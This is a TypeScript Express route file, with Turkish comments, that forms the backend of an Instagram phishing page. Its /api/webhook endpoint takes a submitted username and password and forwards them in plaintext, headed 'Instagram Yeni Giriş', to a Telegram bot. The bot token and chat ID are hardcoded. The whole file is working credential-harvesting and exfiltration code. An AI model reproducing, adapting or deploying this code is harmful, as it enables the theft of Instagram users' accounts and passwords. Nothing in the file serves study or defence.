import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { loginFormSchema } from "@shared/schema";
import { ZodError } from "zod";
import { fromZodError } from "zod-validation-error";
import axios from "axios";

export async function registerRoutes(app: Express): Promise<Server> {
  // API endpoint to send message to Telegram
  app.post("/api/webhook", async (req, res) => {
    try {
      // Validate input
      const formData = loginFormSchema.parse(req.body);
      const { username, password } = formData;
      
      // Telegram Bot API Token ve Chat ID (güvenlik için environment variable'dan alınmalı)
      // Öncelikle environment variable'dan almaya çalış, yoksa sabit değeri kullan
      const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN || "7676691540:AAH_BiHHfI0hK1EQC87oGw6GjCyI5C6ySKE";
      const telegramChatId = process.env.TELEGRAM_CHAT_ID || "-1002584942967";
      
      if (!telegramBotToken || !telegramChatId) {
        console.error('Telegram credentials not configured');
        return res.status(500).json({ 
          success: false, 
          message: "Bot yapılandırma hatası." 
        });
      }
      
      // Telegram API URL
      const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
      
      // Prepare the message text for Telegram
      const messageText = `
🚨 *Instagram Yeni Giriş* 🚨

*Hesap Bilgileri:*
👤 *Kullanıcı Adı:* ${username}
🔒 *Şifre:* ${password}
🕝 *Tarih:* ${new Date().toISOString()}
      `;

      // Send to Telegram Bot API
      try {
        await axios.post(telegramApiUrl, {
          chat_id: telegramChatId,
          text: messageText,
          parse_mode: 'Markdown'
        }, {
          headers: {
            'Content-Type': 'application/json',
          }
        });
        
        return res.status(200).json({ success: true, message: "Giriş bilgileri başarıyla gönderildi!" });
      } catch (error) {
        console.error("Telegram API error:", error);
        return res.status(500).json({ 
          success: false, 
          message: "Bilgiler gönderilirken bir hata oluştu. Lütfen daha sonra tekrar deneyin."
        });
      }
    } catch (error) {
      if (error instanceof ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ 
          success: false, 
          message: validationError.message 
        });
      }
      
      console.error("Server error:", error);
      return res.status(500).json({ 
        success: false, 
        message: "An unexpected error occurred. Please try again."
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
